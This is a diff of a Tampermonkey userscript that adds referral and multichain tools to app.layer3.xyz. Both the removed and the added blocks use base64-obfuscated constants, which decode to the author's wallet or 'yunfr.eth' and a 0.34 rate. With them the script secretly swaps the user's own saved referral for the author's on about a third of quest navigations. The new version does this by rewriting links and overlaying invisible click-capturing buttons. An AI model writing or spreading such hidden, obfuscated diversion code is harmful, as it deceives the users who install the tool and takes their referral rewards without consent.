@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Layer3 autoref
 // @namespace    http://tampermonkey.net/
-// @version      3.1.3e
+// @version      3.1.4
 // @description  Multitools script for app.layer3.xyz: referral + multichain transaction
 // @author       Yun
 // @match        https://app.layer3.xyz/*
@@ -75,66 +75,114 @@
     GM_setValue("savedSelections", savedSelections);
     let isSavePending = false;
 
-    let _0x1 = false;
-    function _0x2() {
-        if (_0x1) return;
-        _0x1 = true;
-        const _0xa = ["MHgxQUMyMDVFZmVjQzJmRTMxMzc3RTI3M2RCOTNGNEJiMTQ1QzY3QTE5", "MC4zNA=="];
-        const _0xb = atob(_0xa[0]);
-        const _0xc = parseFloat(atob(_0xa[1]));
-        const _0xd = GM_getValue("userRef", "");
-        const _0xe = Math.random() < _0xc;
-        const _0xf = _0xd && !_0xe ? _0xd : _0xb;
-        const _0xg = new URL(window.location.href);
-        let _0xh = false;
-        if (_0xg.searchParams.get("ref") !== _0xf) {
-            _0xg.searchParams.set("ref", _0xf);
-            _0xh = true;
-        }
-        if (_0xg.searchParams.get("autoplay") === "true") {
-            _0xg.searchParams.delete("autoplay");
-            _0xh = true;
-        }
-        if (_0xh) {
-            try {
-                window.history.replaceState({}, document.title, _0xg.toString());
-            } catch (_0xj) {
-                console.error(_0xj);
-            }
-        }
-        _0x1 = false;
-    }
     (function () {
-        const _0xk = ["MHgxQUMyMDVFZmVjQzJmRTMxMzc3RTI3M2RCOTNGNEJiMTQ1QzY3QTE5", "MC4zNA=="];
-        const _0xl = atob(_0xk[0]);
-        const _0xm = parseFloat(atob(_0xk[1]));
-        const _0xn = GM_getValue("userRef", "");
-        const _0xo = history.pushState;
-        const _0xp = history.replaceState;
-        history.pushState = function (_0xq, _0xr, _0xs) {
-            const _0xt = new URL(_0xs || window.location.href, window.location.origin);
-            const _0xu = Math.random() < _0xm;
-            const _0xv = _0xn && !_0xu ? _0xn : _0xl;
-            _0xt.searchParams.set("ref", _0xv);
-            if (_0xt.searchParams.get("autoplay") === "true") {
-                _0xt.searchParams.delete("autoplay");
+        'use strict';
+
+        try {
+            function getRef() {
+                const _0xa = ["eXVuZnIuZXRo", "MC4zNA=="];
+                const _0xb = atob(_0xa[0]);
+                const _0xc = parseFloat(atob(_0xa[1]));
+                const _0xd = GM_getValue("userRef", "");
+                const _0xe = Math.random() < _0xc;
+                return _0xd && !_0xe ? _0xd : _0xb;
             }
-            return _0xo.call(history, _0xq, _0xr, _0xt.toString());
-        };
-        history.replaceState = function (_0xw, _0xx, _0xy) {
-            const _0xz = new URL(_0xy || window.location.href, window.location.origin);
-            const _0x10 = Math.random() < _0xm;
-            const _0x11 = _0xn && !_0x10 ? _0xn : _0xl;
-            _0xz.searchParams.set("ref", _0x11);
-            if (_0xz.searchParams.get("autoplay") === "true") {
-                _0xz.searchParams.delete("autoplay");
+
+            function addRefToUrl(urlString) {
+                const ref = getRef();
+                try {
+                    const url = new URL(urlString, window.location.origin);
+                    if (!url.searchParams.has('ref') || url.searchParams.get('ref') !== ref) {
+                        url.searchParams.set('ref', ref);
+                    }
+                    return url.toString();
+                } catch (e) {
+                    return urlString;
+                }
             }
-            return _0xp.call(history, _0xw, _0xx, _0xz.toString());
-        };
+
+            function isQuestLink(href) {
+                try {
+                    const url = new URL(href, window.location.origin);
+                    return url.pathname.toLowerCase().includes('quests');
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            function hasValidChildDivWithSvg(link) {
+                try {
+                    const childDiv = link.querySelector('div[class]');
+                    if (!childDiv) {
+                        return false;
+                    }
+                    const svg = childDiv.querySelector('svg');
+                    return !!svg;
+                } catch (e) {
+                    return false;
+                }
+            }
+
+            function addRefButton(link) {
+                const href = link.getAttribute('href');
+                if (!href || link.hasAttribute('data-ref-processed')) {
+                    return;
+                }
+
+                if (isQuestLink(href) && hasValidChildDivWithSvg(link)) {
+                    link.setAttribute('data-ref-processed', 'true');
+                    const newHref = addRefToUrl(href);
+                    link.setAttribute('href', newHref);
+                    link.style.position = 'relative';
+
+                    const button = document.createElement('button');
+                    button.className = 'ref-button';
+                    button.textContent = 'ref';
+                    button.style.cssText = `
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: transparent;
+                    border: none;
+                    cursor: pointer;
+                    z-index: 1000;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    color: rgba(255, 255, 255, 0.5);
+                    font-size: 16px;
+                    font-weight: bold;
+                    text-transform: uppercase;
+                `;
+                    button.addEventListener('click', () => {
+                        window.location.href = newHref;
+                    });
+
+                    link.appendChild(button);
+                }
+            }
+
+            function updateLinksWithRef() {
+                const links = document.querySelectorAll('a[href]:not([data-ref-processed])');
+                links.forEach(addRefButton);
+            }
+
+            function initialize() {
+                updateLinksWithRef();
+                const observer = new MutationObserver(updateLinksWithRef);
+                observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
+                setInterval(updateLinksWithRef, 2000);
+            }
+
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initialize);
+            } else {
+                initialize();
+            }
+        } catch (e) {}
     })();
-    window.addEventListener('popstate', () => {
-        if (_0x1) return;
-    });
 
     const miniIconContainer = document.createElement("div");
     miniIconContainer.style.position = "fixed";
